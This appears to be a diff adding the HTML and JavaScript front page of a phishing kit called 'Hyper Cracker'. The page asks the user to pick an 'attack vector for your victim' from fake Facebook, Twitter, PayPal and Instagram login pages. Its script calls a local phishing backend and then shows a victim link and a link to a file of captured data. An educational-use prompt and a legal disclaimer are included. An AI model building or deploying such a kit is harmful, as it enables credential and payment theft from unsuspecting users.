@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+<meta name="theme-color" content="#212121"> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
+<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"> 
+<meta name="google" content="notranslate"> 
+<meta property="og:type" content="Hyper Cracker"> 
+<meta property="og:title" content="Hyper Cracker"> 
+<meta property="og:url" content="https://hypercracker.ga"> 
+<meta property="og:description" content="The official hacking website"> 
+<meta property="og:site_name" content="Hyper Cracker"> 
+<meta property="og:image" content="https://hypercracker.ga/favicon.png"> 
+<link rel="icon" href="favicon.png" type="image/x-icon"> 
+<title>Hyper Cracker</title>
+<script type="text/javascript" src="jquery.min.js"></script>
+<style>img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] { display: none; }</style>
+<style type="text/css">
+*{
+padding:0;
+margin:0;
+outline:0;
+
+}
+body {
+background:black;
+font-family:lato;
+}
+button{
+background:transparent;
+border:0;
+height:30px;
+font-size:12px;
+color:#0dd;
+}
+table{
+border:0;
+color:red;
+font-size:12px;
+
+}
+#user{
+font-size:15px;
+margin-left:10px;
+border:0;
+}
+#dt button {
+background:#0dd;
+height:30px;
+margin-left:10px;
+width:30px;
+color:black;
+}
+#dt{
+color:red;
+width:100%;
+overflow:hidden;
+height:200px;
+display:none;
+}
+#hs,#yu,#his{
+color:#0dd;
+font-size:15px;
+margin-left:10px;
+}
+#lnk,#lnik{
+position:relative;
+width:90%;
+overflow:scroll;
+height:20px;
+margin-left:10px;
+}
+code{
+color:#0dd;
+}
+pre {
+color:red;
+
+}
+kbd{
+color:#0dd;
+}
+bdi{
+color:silver;
+}
+.logo{
+position:relative;
+
+}
+.logo .be{
+color:#f00;
+font-size:30px;
+position:absolute;
+left:130px;
+top:50px;
+z-index:-1;
+}
+#yiy{
+display:none;
+}
+</style>
+</head>
+
+<body>
+<!--<pre style="margin:auto;color:#0dd;font-weight:bolder;" >
+
+     _                /\     _
+     \\     _    /\  / /    //
+      \ \   \ \  \ \ \ \   / /
+        \ \  \ \ | | / /  / /
+         \  \| |/ /_/  /_/  /
+          ~~~~~~~~~~~~~~~~~~
+
+
+</pre>-->
+
+<pre>
+___   _  _   ___   ___  __    <kbd>  ___  ___  </kbd>
+|\_|/ |\/|   !__  | _  √__\    <kbd> |__| |    </kbd>
+|__|  |  |_  !__  |__] |  |    <kbd> |    |__    </kbd>
+
+                         <bdi>v</bdi>0<bdi>.</bdi>2<bdi>.</bdi>0 
+</pre>
+<pre>
+
+-----------------------------------------
+SELECT ANY ATTACK VECTOR FOR YOUR VICTIM:
+-----------------------------------------
+
+
+</pre>
+<table cellspacing="5px"  id="tb" >
+<tr>
+<td>[<code>01</code>] &nbsp;<button onclick="str(this)">FB_Security_Fake</button></td>
+<td>[<code>02</code>] &nbsp;<button onclick="str(this)">Twitter</button></td>
+</tr>
+<tr>
+<td>[<code>03</code>] &nbsp;<button onclick="str(this)">FB_Standard</button></td>
+<td>[<code>04</code>] &nbsp;<button onclick="str(this)">Paypal</button></td>
+</tr>
+<tr>
+<td>[<code>05</code>] &nbsp;<button onclick="str(this)">InstaFollowers</button></td>
+<td>[<code>06</code>] &nbsp;<button onclick="str(this)">Instagram_Web</button></td>
+</tr>
+<tr>
+
+</tr>
+<tr>
+
+</tr>
+<tr>
+</tr>
+</table>
+
+<div id="dt" >
+
+<div id="user" > Do you agree to use this tool for educational purposes only? </div><br>
+<button onclick="sty()">Yes</button><button onclick="stui()">No</button>
+</div>
+
+<div id="yiy" >
+<span id="his" ></span>
+<pre id="lnk" ><a id="link" href=""  ></a></pre><br>
+<span id="yu" ></span>
+<pre id="lnk" ><a id="linkf" href=""  ></a></pre>
+</div>
+
+<div style="color:#0dd;font-size:13px;" >
+<span style="color:red" >Legal Disclaimer:</span> Usage of OMEGA-PC for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 
+</div>
+<script type="text/javascript">
+var xx=0;
+var xu;
+function str(x){
+xu=(x.innerHTML).toLowerCase();
+
+document.getElementById("dt").style.display="block";
+document.getElementById("tb").style.display="none";
+
+}
+function sty(){
+var values="";
+$.post("http://localhost:8080/phishing/new.php",values,function(data){
+
+
+xx=data;
+ document.getElementById("his").innerHTML="---Your Link";
+ document.getElementById("yu").innerHTML="---Your Data File Link";
+ document.getElementById("dt").style.display="none";
+ document.getElementById("yiy").style.display="block";
+ $("#link").attr("href","http://"+window.location.hostname+"/web/"+xu+"/index.php?x="+xx);
+ $("#link").html("http://"+window.location.hostname+"/web/"+xu+"/index.php?x="+xx);
+ $("#linkf").attr("href","http://"+window.location.hostname+"/files/"+xx+".txt");
+ $("#linkf").html("http://"+window.location.hostname+"/files/"+xx+".txt");
+}
+);}
+function stui(){
+window.location.href="https://presentnews360.blogspot.com";
+}
+</script>
+</body>
+</html>
